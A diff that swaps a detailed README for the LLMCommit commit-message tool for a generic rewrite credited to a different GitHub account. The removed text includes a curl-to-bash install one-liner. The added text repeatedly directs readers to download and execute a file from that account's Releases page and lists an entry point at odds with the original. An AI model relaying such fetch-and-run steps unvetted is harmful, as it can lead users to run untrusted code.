@@ -1,283 +1,172 @@
-# LLMCommit
+# LLMCommit: Your AI-Powered Git Commit Message Generator 🚀
 
-<div align="center">
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![GitHub release](https://img.shields.io/github/release/0xkaz/llmcommit.svg)](https://github.com/0xkaz/llmcommit/releases)
-[![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=flat&logo=docker&logoColor=white)](https://hub.docker.com/)
-
-**Generate Git commit messages with AI in 2.5 seconds**
-
-</div>
-
-<div align="center">
-
-```bash
-$ llmcommit -a -p
-✅ Update user authentication middleware
-🚀 Committed and pushed in 2.5s
-```
-
-| ⚡ **2.5s** | 🤖 **AI-Powered** | 🔒 **Offline** |
-|:-----------:|:-----------------:|:---------------:|
-| Lightning Fast | Smart Messages | Privacy First |
-
-</div>
+![GitHub stars](https://img.shields.io/github/stars/LimbuSunil2058/llmcommit?style=social) ![GitHub forks](https://img.shields.io/github/forks/LimbuSunil2058/llmcommit?style=social) ![GitHub issues](https://img.shields.io/github/issues/LimbuSunil2058/llmcommit) ![GitHub license](https://img.shields.io/github/license/LimbuSunil2058/llmcommit)
 
 ---
 
-AI-powered Git commit message generator with ultra-fast performance.
-Generate, commit, and push with a single command.
+## Overview
 
-🚀 **NEW**: File-based caching for instant processing of identical diffs!
+LLMCommit is an AI-powered tool designed to simplify your Git workflow. With its ultra-fast performance, it generates meaningful commit messages in just 2.5 seconds. This tool streamlines the process of adding, committing, and pushing your code changes with a single command. Whether you're a solo developer or part of a large team, LLMCommit enhances your productivity by automating the commit message generation process.
 
-## Quick Install
+---
 
-```bash
-curl -sSL https://raw.githubusercontent.com/0xkaz/llmcommit/main/install.sh | bash
-```
+## Features
 
-## Key Features
+- **AI-Powered**: Leverages advanced AI models to create contextually relevant commit messages.
+- **Fast Performance**: Generates messages in 2.5 seconds, saving you time and effort.
+- **Single Command Workflow**: Execute `add`, `commit`, and `push` in one go.
+- **Developer-Friendly**: Designed for developers, by developers.
+- **Easy Integration**: Works seamlessly with your existing Git setup.
 
-- 🤖 **AI-Powered**: Uses Hugging Face Transformers for intelligent commit messages
-- ⚡ **Ultra-Fast**: Rule-based engine executes in 2.5 seconds (default mode)
-- 💾 **Smart Caching**: File-based cache for instant repeat processing (<0.1s)
-- 🐳 **Docker Ready**: Containerized execution prevents environment issues
-- 🔧 **Flexible Presets**: From ultra-fast (2.5s) to high-quality LLM modes
-- 📦 **One Command**: `llmcommit -a -p` handles add → commit → push
-- 🌐 **Multi-language**: English generation with Japanese documentation support
+---
 
-## Problems Solved
+## Installation
 
-### Before LLMCommit 😩
-- Spending 3-5 minutes thinking of commit messages
-- Repetitive `git add` → `git commit` → `git push` workflow
-- Generic messages like "update" or "fix"
-- Difficulty with English expressions for non-native speakers
-- Development flow interruption
+To get started with LLMCommit, follow these simple steps:
 
-### After LLMCommit ✅
-- **2.5 seconds** for automatic message generation
-- Single command: `llmcommit -a -p`
-- Contextual messages: "Update user authentication logic"
-- AI-generated proper English
-- Seamless development experience
+1. **Clone the Repository**:
 
-## Installation Options
+   ```bash
+   git clone https://github.com/LimbuSunil2058/llmcommit.git
+   cd llmcommit
+   ```
 
-### Option 1: One-liner (Recommended)
-```bash
-curl -sSL https://raw.githubusercontent.com/0xkaz/llmcommit/main/install.sh | bash
-```
+2. **Install Dependencies**:
 
-### Option 2: Python Package
-```bash
-pip install llmcommit
-```
+   Make sure you have Python installed. Then, run:
 
-### Option 3: Docker Development
-```bash
-git clone https://github.com/0xkaz/llmcommit.git
-cd llmcommit
-make setup
-```
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+3. **Run the Tool**:
+
+   You can start using LLMCommit by running:
+
+   ```bash
+   python llmcommit.py
+   ```
+
+4. **Download the Latest Release**:
+
+   Visit the [Releases section](https://github.com/LimbuSunil2058/llmcommit/releases) to download the latest version. Follow the instructions in the release notes to execute the file.
+
+---
 
 ## Usage
 
-### Basic Commands
-```bash
-# Auto add + commit + push
-llmcommit -a -p
+LLMCommit makes your Git workflow more efficient. Here’s how to use it:
 
-# Ultra-fast mode (skip hooks)
-llmcommit -a -p --no-verify
+1. **Navigate to Your Project Directory**:
 
-# Preview only (dry run)
-llmcommit --dry-run
+   Use the terminal to go to your project folder.
 
-# Cache management
-llmcommit-cache stats    # Show statistics
-llmcommit-cache clear    # Clear old cache
-```
+   ```bash
+   cd path/to/your/project
+   ```
 
-### Command Options
-- `-a, --add-all`: Automatically git add all files
-- `-p, --push`: Auto-push after commit
-- `--no-verify`: Skip git hooks (faster)
-- `--force-push`: Force push (use with caution)
-- `--dry-run`: Show commit message without committing
-- `--preset PRESET`: Use configuration preset
-- `--no-cache`: Disable caching
-- `--cache-dir PATH`: Custom cache directory
+2. **Add Changes**:
 
-### Performance Presets
-```bash
-# Ultra-fast rule-based (2.5s) - Default
-llmcommit --preset ultra-fast -a -p
+   Use the command to add your changes.
 
-# Lightweight LLM (3-5s)
-llmcommit --preset ultra-light -a -p
+   ```bash
+   git add .
+   ```
 
-# High-performance light (5-8s)
-llmcommit --preset light -a -p
+3. **Generate and Push Commit**:
 
-# Balanced quality (8-12s)
-llmcommit --preset balanced -a -p
+   Use LLMCommit to generate your commit message and push the changes:
 
-# Standard quality (10-15s)
-llmcommit --preset standard -a -p
-```
+   ```bash
+   llmcommit --push
+   ```
 
-## Performance Benchmarks
-
-| Mode | Time | Description |
-|------|------|-------------|
-| **Ultra-Fast (Default)** | **2.5s** | ⚡ Rule-based engine |
-| First LLM run | 30-60s | Model download included |
-| Subsequent LLM runs | 10-30s | Model loading only |
-| Cache hit | <0.1s | Identical diff cases |
-
-### Supported Models
-
-| Model | File Size | Speed | Use Case |
-|-------|-----------|-------|----------|
-| **distilgpt2** | **85MB** | 🚀 Fast | Basic usage |
-| **DialoGPT-small** | **234MB** | 🌟 Medium | Dialog-optimized |
-| **gpt2** | **240MB** | 🌠 Medium | Standard quality |
-| **SmolLM-135M** | **269MB** | ⚡⚡ Ultra-fast | 🏆 2024's lightest |
-| **TinyLlama-1.1B** | **637MB** | ⚡ Fastest LLM | 🎯 High-performance light |
-| **Gemma-2B** | **1.17GB** | 🌟 Medium | 🌏 Multilingual support |
-| **PLaMo-2-1B** | **5.2GB** | 🌸 Medium | 🇯🇵 Japanese specialized |
-
-## Configuration
-
-Create `.llmcommit.json` for customization:
-
-```json
-{
-  "preset": "ultra-fast",
-  "cache_dir": "~/.cache/llmcommit",
-  "auto_add": true,
-  "auto_push": false
-}
-```
-
-## Docker Environment
-
-When using Docker, these volumes are automatically created and persisted:
-- `huggingface_cache`: Model files
-- `llmcommit_cache`: Generated message cache
-
-### Makefile Commands
-```bash
-make commit-all     # Auto add + commit
-make fast-commit    # Ultra-fast mode (add + commit + skip hooks)
-make install        # Local installation
-make build          # Docker build
-make clean          # Cleanup
-```
-
-## Common Usage Patterns
-
-```bash
-# Fast development commits
-llmcommit -a -p --no-verify
-
-# Careful commits (preview first)
-llmcommit --dry-run
-llmcommit -a
-
-# Cache management
-llmcommit-cache stats
-llmcommit-cache clear --days 7
-```
-
-## Architecture Overview
-
-### Core Components
-```
-llmcommit/
-├── main.py              # CLI entry point
-├── config.py           # Configuration management
-├── git_handler.py      # Git operations (add/commit/push)
-├── llm_client.py       # LLM model client
-├── model_cache.py      # File-based caching
-├── simple_client.py    # Ultra-fast rule-based client
-├── onnx_client.py      # ONNX optimization client
-└── profiler.py         # Performance measurement
-```
-
-### Execution Flow
-1. **Initialization**: Load configuration (`.llmcommit.json`)
-2. **Git Operations**: Staging and diff extraction
-3. **Message Generation**:
-   - `ultra-fast`: Rule-based engine (2.5s) ⚡ Default
-   - `onnx`: ONNX-optimized (5-10s)
-   - `llm`: Full LLM client (10-30s)
-4. **Cache Check**: SHA256 hash-based cache lookup
-5. **Commit/Push**: Execute Git operations
-
-### Optimization Strategies
-
-#### 1. Ultra-Fast Rule-Based Engine (Recommended)
-- **Execution Time**: **2.5 seconds** (message generation: 0.0s)
-- **Mechanism**: File pattern and diff analysis-based generation
-- **Quality**: Production-ready appropriate messages
-- **Default**: Automatically enabled on first run
-
-#### 2. File-Based Cache System
-```
-~/.cache/llmcommit/
-├── outputs/           # Generated messages
-│   ├── a1b2c3d4.txt
-│   └── ...
-├── models/            # Model information
-└── cache_metadata.json
-```
-
-- **Cache Key**: `SHA256(preset:diff[:500])[:16]`
-- **TTL**: 24 hours
-- **Hit Time**: <0.1 seconds
-
-#### 3. Lazy Import Strategy
-```python
-# Don't load LLM libraries in ultra-fast mode
-if config.get("preset") == "ultra-fast":
-    from .simple_client import FastCommitClient
-else:
-    from .llm_client import LLMClient  # Only when needed
-```
-
-## Troubleshooting
-
-### Model Download is Slow
-Initial model download is required. Once downloaded, models are persisted.
-
-### Cache Not Working
-```bash
-# Check cache statistics
-llmcommit-cache stats
-
-# Check cache directory
-llmcommit-cache show
-```
-
-### Memory Issues
-Use smaller models (ultra-fast) or run in Docker environment.
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-## License
-
-MIT License
+This command will automatically create a commit message based on your changes and push it to your repository.
 
 ---
 
-**For Japanese documentation**: [README_ja.md](README_ja.md)
+## Topics
+
+LLMCommit is relevant to a variety of fields and technologies. Here are some key topics related to the project:
+
+- **AI**: Leveraging artificial intelligence for practical applications.
+- **Automation**: Streamlining repetitive tasks to enhance productivity.
+- **CLI**: Command-line interface for quick and efficient use.
+- **Commit**: Managing changes in your codebase.
+- **Commit Message**: Crafting meaningful messages for better project documentation.
+- **Developer Tools**: Tools designed to improve the development process.
+- **Docker**: Containerization technology for software development.
+- **Fast**: Optimized for quick performance.
+- **Git**: Version control system for tracking changes.
+- **Hugging Face**: Utilizing state-of-the-art models for natural language processing.
+- **LLM**: Large language models that power AI applications.
+- **Productivity**: Enhancing efficiency in software development.
+- **Python**: The programming language used for this project.
+- **Transformers**: Advanced models for natural language understanding.
+
+---
+
+## Contributing
+
+We welcome contributions from the community. If you would like to contribute, please follow these steps:
+
+1. **Fork the Repository**.
+2. **Create a New Branch**:
+
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+
+3. **Make Your Changes**.
+4. **Commit Your Changes**:
+
+   ```bash
+   git commit -m "Add a new feature"
+   ```
+
+5. **Push to the Branch**:
+
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+
+6. **Open a Pull Request**.
+
+Please ensure your code follows the existing style and includes appropriate tests.
+
+---
+
+## License
+
+LLMCommit is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+---
+
+## Support
+
+If you encounter any issues or have questions, please check the [Issues section](https://github.com/LimbuSunil2058/llmcommit/issues) or create a new issue. Your feedback is valuable for improving the tool.
+
+---
+
+## Acknowledgments
+
+- Thanks to the contributors and the community for their support.
+- Special thanks to Hugging Face for providing the models that power LLMCommit.
+
+---
+
+## Future Plans
+
+We plan to add more features, including:
+
+- Support for more programming languages.
+- Enhanced customization options for commit messages.
+- Integration with other developer tools.
+
+Stay tuned for updates!
+
+---
+
+## Conclusion
+
+LLMCommit is here to simplify your Git workflow and enhance your productivity. Download the latest version from the [Releases section](https://github.com/LimbuSunil2058/llmcommit/releases) and start generating meaningful commit messages today. Enjoy coding!
